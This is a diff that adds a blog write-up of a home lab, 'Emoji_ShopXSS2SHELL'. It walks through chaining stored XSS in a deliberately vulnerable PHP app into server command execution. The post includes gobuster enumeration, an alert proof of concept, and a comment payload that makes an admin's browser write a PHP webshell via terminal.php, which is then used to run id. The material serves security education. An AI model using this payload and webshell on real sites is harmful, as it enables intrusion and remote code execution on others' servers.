@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Emoji_ShopXSS2SHELL — Stored XSS to RCE Home Lab — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="A hands-on home-lab writeup demonstrating how stored XSS can be chained with privileged administrative functionality and unsafe command execution to achieve server-side command execution.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/emoji-shop-xss2shell/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Emoji_ShopXSS2SHELL — Stored XSS to RCE Home Lab">
+  <meta property="og:description" content="A hands-on home-lab writeup demonstrating how stored XSS can be chained with privileged administrative functionality and unsafe command execution to achieve server-side command execution.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/emoji-shop-xss2shell/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-12-08T00:00:00.000Z">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="attack-techniques">
+  <meta property="article:tag" content="post-exploitation">
+  <meta property="article:tag" content="lab-setup">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Emoji_ShopXSS2SHELL — Stored XSS to RCE Home Lab">
+  <meta name="twitter:description" content="A hands-on home-lab writeup demonstrating how stored XSS can be chained with privileged administrative functionality and unsafe command execution to achieve server-side command execution.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Emoji_ShopXSS2SHELL — Stored XSS to RCE Home Lab","description":"A hands-on home-lab writeup demonstrating how stored XSS can be chained with privileged administrative functionality and unsafe command execution to achieve server-side command execution.","datePublished":"2026-12-08T00:00:00.000Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/emoji-shop-xss2shell/","keywords":"web-security, pentesting, attack-techniques, post-exploitation, lab-setup"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-emoji-shop-xss2shell" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>Emoji_ShopXSS2SHELL — Stored XSS to RCE Home Lab</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 12-08-2026</span>
+        <span>·</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">attack-techniques</span><span class="card-cat-chip">post-exploitation</span><span class="card-cat-chip">lab-setup</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<p><strong>Repository:</strong> <a href="https://github.com/giriaryan694-a11y/Emoji_ShopXSS2SHELL/">Emoji_ShopXSS2SHELL</a></p>
+<p><strong>Author:</strong> Aryan Giri</p>
+<h2>Lab Overview</h2>
+<p><strong>Emoji_ShopXSS2SHELL</strong> is an intentionally vulnerable, lightweight web application designed for cybersecurity education, authorized security testing, CTF practice, and web application security research.</p>
+<p>The lab demonstrates an attack chain involving:</p>
+<ul>
+<li>Stored Cross-Site Scripting (XSS)</li>
+<li>Privileged administrative functionality</li>
+<li>Unsafe command execution</li>
+<li>Browser-based administrative session abuse</li>
+<li>Webshell deployment</li>
+<li>Command execution through the resulting shell</li>
+</ul>
+<p>The objective is to understand how a seemingly simple stored XSS vulnerability can become significantly more impactful when it executes inside a privileged administrator&#39;s browser session.</p>
+<h2>Application Setup</h2>
+<p>After installing and starting the lab, the application is available at:</p>
+<p><code>http://10.19.115.73:8081/login.php</code></p>
+<img width="1409" height="857" alt="Screenshot 2026-08-12 100207" src="https://github.com/user-attachments/assets/1a8155f5-3e2a-4cfd-b28f-defad9beaac1" />
+
+
+<p>The application initially presents a login page. Since this is a local intentionally vulnerable lab, a normal user account can be created for testing.</p>
+<h2>Creating a Normal User</h2>
+<p>I registered a test account using:</p>
+<pre><code class="language-text">Username: tester1
+Password: admin
+</code></pre>
+<img width="1488" height="867" alt="Screenshot 2026-08-12 100240" src="https://github.com/user-attachments/assets/9f1b3aca-4828-42fd-a251-03d3b9b0e98c" />
+
+
+<p>After registration completes, the newly created account can be used to authenticate.</p>
+<img width="1444" height="852" alt="Screenshot 2026-08-12 100330" src="https://github.com/user-attachments/assets/4135ab0d-6725-48fe-8e3b-68591ebd8185" />
+
+
+<p>After logging in, the user is redirected to the main application interface.</p>
+<h2>Exploring the Emoji Shop</h2>
+<p>The main page contains a list of emojis. Each entry provides access to additional information, including details and comments.</p>
+<img width="1586" height="876" alt="Screenshot 2026-08-12 100359" src="https://github.com/user-attachments/assets/eb43be6e-dc1f-4bb9-850c-6b51bdc677ff" />
+
+
+<p>The comments functionality is particularly interesting because user-controlled content is stored by the application and later rendered to other users.</p>
+<p>For testing the administrative impact of the vulnerability, I used two separate Firefox profiles:</p>
+<ul>
+<li>A normal-user session</li>
+<li>A separate administrator session</li>
+</ul>
+<p>Keeping the sessions isolated makes it easier to observe which browser context executes the stored JavaScript.</p>
+<h2>Administrator Session</h2>
+<p>The administrator account used for the lab is:</p>
+<pre><code class="language-text">Username: admin
+Password: admin123
+</code></pre>
+<p>After logging in as the administrator, the application exposes additional administrative functionality.</p>
+<img width="1605" height="834" alt="Screenshot 2026-08-12 100838" src="https://github.com/user-attachments/assets/9edf1cc5-1014-4266-b4cc-2d71a133434d" />
+
+
+<p>The administrator can access:</p>
+<pre><code class="language-text">admin.php
+</code></pre>
+<img width="1577" height="860" alt="Screenshot 2026-08-12 100917" src="https://github.com/user-attachments/assets/0175a0b3-30ad-46da-9b88-de8b90f27487" />
+
+
+<p>The administrative interface provides functionality that is not available to a regular user.</p>
+<h2>Administrative Command Execution</h2>
+<p>The lab also exposes a web terminal through:</p>
+<pre><code class="language-text">terminal.php
+</code></pre>
+<img width="1583" height="807" alt="Screenshot 2026-08-12 101132" src="https://github.com/user-attachments/assets/0577b85d-be98-4a90-b937-24281f756494" />
+
+
+<p>The terminal allows commands to be executed through the web application.</p>
+<p>There is also an <code>exec.php</code> endpoint capable of command execution, but it requires administrator privileges.</p>
+<p>This difference is important to the attack chain: a normal user cannot directly access the privileged command-execution functionality, but stored JavaScript executed inside an administrator&#39;s browser can make requests using the administrator&#39;s existing privileges.</p>
+<h2>Directory Enumeration</h2>
+<p>Although the application is open source and the relevant endpoints are already known, I also performed directory enumeration to demonstrate the reconnaissance phase.</p>
+<p>I used Gobuster with the common directory wordlist and PHP extension discovery:</p>
+<pre><code class="language-bash">gobuster dir \
+  -u http://10.19.115.73:8081 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php \
+  --exclude-length 3449
+</code></pre>
+<img width="657" height="512" alt="Screenshot 2026-08-12 134534" src="https://github.com/user-attachments/assets/78859318-0550-4763-b185-1167b451f0ce" />
+
+
+<p>The enumeration identifies application endpoints including:</p>
+<pre><code class="language-text">login.php
+admin.php
+terminal.php
+exec.php
+</code></pre>
+<p>The purpose here is not to discover a previously unknown application but to demonstrate how endpoint enumeration fits into a normal web application assessment.</p>
+<h2>Identifying the Stored XSS</h2>
+<p>Returning to the normal-user session, I opened an emoji&#39;s details and comments interface.</p>
+<img width="1580" height="906" alt="Screenshot 2026-08-12 135725" src="https://github.com/user-attachments/assets/09581dba-dee0-4f3a-b509-057e59d2637d" />
+
+
+<p>The comment field accepts HTML/JavaScript content.</p>
+<p>I started with a simple proof-of-concept payload:</p>
+<pre><code class="language-html">&lt;script&gt;alert(0)&lt;/script&gt;
+</code></pre>
+<img width="1054" height="634" alt="Screenshot 2026-08-12 135814" src="https://github.com/user-attachments/assets/410ac387-95c8-413b-b70f-ad7820296d9e" />
+
+
+<p>After submitting the comment, the JavaScript executes when the affected page is rendered.</p>
+<img width="843" height="443" alt="Screenshot 2026-08-12 135844" src="https://github.com/user-attachments/assets/b84c3f24-15b9-4577-9dd1-7eba80f3d3b9" />
+
+
+<p>This confirms that the comment is not being safely encoded before being inserted into the page.</p>
+<p>The important distinction is that this is <strong>stored XSS</strong> rather than reflected XSS. The malicious content is persisted by the application and can subsequently execute when another user views the affected content.</p>
+<h2>Executing the XSS in the Administrator Context</h2>
+<p>The next step is to observe what happens when the administrator views the stored comment.</p>
+<p>I switched back to the administrator Firefox session and opened <strong>Comments Overview</strong>.</p>
+<img width="1618" height="877" alt="Screenshot 2026-08-12 135918" src="https://github.com/user-attachments/assets/c5ed98c8-035f-4a38-955d-dc2b04123ab2" />
+
+
+<p>The stored JavaScript executes in the administrator&#39;s browser context.</p>
+<p>After dismissing the JavaScript alert, the interface displays the username associated with the comment, while the original comment content is not displayed normally.</p>
+<img width="1567" height="698" alt="Screenshot 2026-08-12 135953" src="https://github.com/user-attachments/assets/bbe9e3ed-70d3-4396-a93a-1f8980160f87" />
+
+
+<p>The reason is that the browser interprets the <code>&lt;script&gt;</code> element as executable HTML rather than treating it as ordinary text.</p>
+<p>At this point, the vulnerability has crossed an important privilege boundary:</p>
+<pre><code class="language-text">Normal User
+    |
+    v
+Stored Comment
+    |
+    v
+JavaScript Execution
+    |
+    v
+Administrator Browser
+    |
+    v
+Privileged Application Request
+</code></pre>
+<h2>From Stored XSS to Command Execution</h2>
+<p>The administrator&#39;s browser can make authenticated requests to privileged endpoints.</p>
+<p>The lab&#39;s <code>terminal.php</code> endpoint accepts POST requests containing a command. This allows the stored JavaScript to issue a request from the administrator&#39;s browser.</p>
+<p>For the lab demonstration, I used the following payload to create a PHP command-execution shell:</p>
+<pre><code class="language-html">&lt;script&gt;
+fetch(&#39;/terminal.php&#39;, {
+    method: &#39;POST&#39;,
+    headers: {
+        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+    },
+    body: new URLSearchParams({
+        &#39;cmd&#39;: `echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; /var/www/emoji_shop/shell.php`
+    })
+});
+&lt;/script&gt;
+</code></pre>
+<p>The important part of this payload is not the JavaScript itself but the request chain:</p>
+<pre><code class="language-text">Stored XSS
+    |
+    v
+Administrator browser executes JavaScript
+    |
+    v
+Authenticated POST request
+    |
+    v
+terminal.php
+    |
+    v
+Server-side command execution
+    |
+    v
+shell.php created
+</code></pre>
+<img width="1021" height="638" alt="Screenshot 2026-08-12 140214" src="https://github.com/user-attachments/assets/38a52c9f-8078-4bbf-852a-21456c132481" />
+
+
+<p>Once the malicious comment is stored, I return to the administrator session and open <strong>Comments Overview</strong> or refresh the page.</p>
+<p>The JavaScript executes automatically while the administrator is viewing the stored comment.</p>
+<p><a href="https://github.com/user-attachments/assets/118dba0a-c616-4575-9b3d-9c552fbad1df">https://github.com/user-attachments/assets/118dba0a-c616-4575-9b3d-9c552fbad1df</a></p>
+<p>The result is that the server creates:</p>
+<pre><code class="language-text">/var/www/emoji_shop/shell.php
+</code></pre>
+<h2>Accessing the Webshell</h2>
+<p>After the payload executes, I return to the normal browser session.</p>
+<p>The resulting endpoint can be accessed through:</p>
+<pre><code class="language-text">http://10.19.115.73:8081/shell.php?cmd=id
+</code></pre>
+<img width="1522" height="314" alt="Screenshot 2026-08-12 140507" src="https://github.com/user-attachments/assets/211c10da-0170-4c68-8ddf-1e1bc9d9cc99" />
+
+
+<p>The <code>id</code> command confirms that the newly created endpoint is executing commands on the server.</p>
+<p>Additional commands can then be supplied through the <code>cmd</code> parameter.</p>
+<p><a href="https://github.com/user-attachments/assets/b279b718-b644-4afb-a4de-7f715385d3b2">https://github.com/user-attachments/assets/b279b718-b644-4afb-a4de-7f715385d3b2</a></p>
+<p>The resulting chain demonstrates how a stored XSS vulnerability can become a server-side command-execution primitive when combined with privileged functionality.</p>
+<h2>Attack Chain</h2>
+<p>The complete lab flow can be summarized as:</p>
+<pre><code class="language-text">Normal User
+    |
+    | submits malicious comment
+    v
+Stored XSS
+    |
+    | administrator views comments
+    v
+Administrator Browser
+    |
+    | JavaScript executes with admin privileges
+    v
+terminal.php
+    |
+    | authenticated command execution
+    v
+shell.php
+    |
+    | cmd parameter
+    v
+Server Command Execution
+</code></pre>
+<p>The individual vulnerabilities become substantially more dangerous when chained together.</p>
+<p>A simplified privilege flow looks like:</p>
+<pre><code class="language-text">Low Privilege
+     |
+     v
+Stored XSS
+     |
+     v
+Admin Browser Context
+     |
+     v
+Admin-Only Endpoint
+     |
+     v
+Server Command Execution
+</code></pre>
+<h2>Why the Chain Works</h2>
+<p>The core issue is the combination of multiple trust-boundary failures.</p>
+<h3>1. User input is stored without safe output encoding</h3>
+<p>The comment field accepts JavaScript and stores it in a form that is later rendered by another browser.</p>
+<h3>2. The stored content executes in a privileged context</h3>
+<p>The administrator visits the page containing the malicious comment, causing the browser to execute the stored JavaScript.</p>
+<h3>3. Privileged endpoints trust the authenticated browser session</h3>
+<p>The JavaScript executes from the administrator&#39;s browser and can therefore make requests to functionality available to that session.</p>
+<h3>4. The terminal provides server-side command execution</h3>
+<p>Once the privileged request reaches <code>terminal.php</code>, the supplied command is executed by the application.</p>
+<p>The important lesson is that the XSS itself does not directly execute operating-system commands. Instead, it abuses the administrator&#39;s browser context to reach functionality that already has command-execution capability.</p>
+<h2>Lab Takeaways</h2>
+<p>This home lab demonstrates an important web exploitation concept:</p>
+<pre><code class="language-text">XSS != automatically RCE
+</code></pre>
+<p>However:</p>
+<pre><code class="language-text">XSS
++
+Privileged Session
++
+Dangerous Administrative Functionality
+=
+Potential RCE Chain
+</code></pre>
+<p>A low-privileged stored XSS can therefore become a high-impact vulnerability when privileged application functionality is exposed through the same browser session.</p>
+<p>The lab provides a practical environment for studying the relationship between client-side injection, authentication context, authorization boundaries, and server-side command execution.</p>
+<h2>Repository</h2>
+<p>The complete intentionally vulnerable application and lab setup are available in the project repository:</p>
+<p><a href="https://github.com/giriaryan694-a11y/Emoji_ShopXSS2SHELL/">Emoji_ShopXSS2SHELL</a></p>
+<p>This lab should only be deployed and tested in an environment where you have explicit authorization to perform security testing.</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
